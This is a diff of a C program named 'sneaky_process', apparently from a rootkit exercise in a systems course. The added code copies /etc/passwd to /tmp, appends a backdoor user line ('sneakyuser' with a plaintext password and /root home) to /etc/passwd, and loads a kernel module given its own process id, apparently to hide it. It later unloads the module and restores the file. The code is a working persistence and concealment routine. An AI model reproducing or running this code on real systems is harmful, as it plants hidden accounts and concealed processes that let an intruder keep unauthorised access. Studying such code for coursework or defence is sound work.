@@ -6,7 +6,7 @@
 #include<sys/stat.h>
 #include<sys/types.h>
 #include <string.h>
-
+#include <sys/wait.h>
 //const char *originfile="etc/password";
 //const char *tmpfile="tmp/password";
   
@@ -14,23 +14,64 @@
 int main(){
   //#1 print id
   printf("sneaky_process pid:%d\n",getpid());
-
-  /* //#2.1 copy file to destination
-  FILE *f_o =fopen("/etc/passwd","r");
-  char c;
-  FILE *f_w=fopen("test/tmp","w");
-  while((c=fgetc(f_o))!=EOF){
-    fprintf(f_w,"%c",c);
+  int cur_pid=0;
+  //copy
+  if((cur_pid=fork())==0){
+    execlp("cp","cp","/etc/passwd","/tmp/passwd",NULL);
   }
-  fclose(f_o);
-  fclose(f_w);
-  //#2.2 add line to the original
-  FILE *add_line=fopen("test/tmp","a");
-  const char* s="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-  fprintf(add_line,"%s",s);
-  fclose(add_line);
-  //*/
-  //2.1
+  else{
+    int status=0;
+    if(waitpid(cur_pid,&status,WUNTRACED|WCONTINUED)==-1){
+      perror("waitpid");
+      return -1;
+    }
+    if (WIFSIGNALED(status)) {
+      printf("killed by signal %d\n", WTERMSIG(status));
+    } else if (WIFSTOPPED(status)) {
+      printf("stopped by signal %d\n", WSTOPSIG(status));
+    } else if (WIFCONTINUED(status)) {
+      printf("continued\n");
+    }
+  }
+  //add
+ 
+  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
+  //load module
+  char cmd[100];
+  sprintf(cmd, "insmod sneaky_mod.ko sneaky_process_id=%d", (int)getpid());
+  system(cmd);
+
+  while(1){
+    if(getchar()=='q')
+      break;
+  }
+
+  system("rmmod sneaky_mod");
+
+
+
+
+
+  //restore password
+  if((cur_pid=fork())==0){
+    execlp("cp","cp","/tmp/passwd","/etc/passwd",NULL);
+  }
+  else{
+    int status=0;
+    if(waitpid(cur_pid,&status,WUNTRACED|WCONTINUED)==-1){
+      perror("waitpid");
+      return -1;
+    }
+    if (WIFSIGNALED(status)) {
+      printf("killed by signal %d\n", WTERMSIG(status));
+    } else if (WIFSTOPPED(status)) {
+      printf("stopped by signal %d\n", WSTOPSIG(status));
+    } else if (WIFCONTINUED(status)) {
+      printf("continued\n");
+    }
+  }
+  //  while(1){}
+  /*  //2.1
   FILE *f_o =fopen("/etc/passwd","r");
   if(f_o==NULL) {
     perror("cannot open /etc/passwd");
@@ -123,6 +164,7 @@ int main(){
     }
     }*/
   //#5.restore
+  /*
   FILE *f_w_restore =fopen("/etc/passwd","w");
   if(*f_w_restore==NULL) {
     perror("cannot open /etc/passwd");
@@ -144,5 +186,5 @@ int main(){
 
   
   
-  return EXIT_SUCCESS; 
+  return EXIT_SUCCESS; */
 }
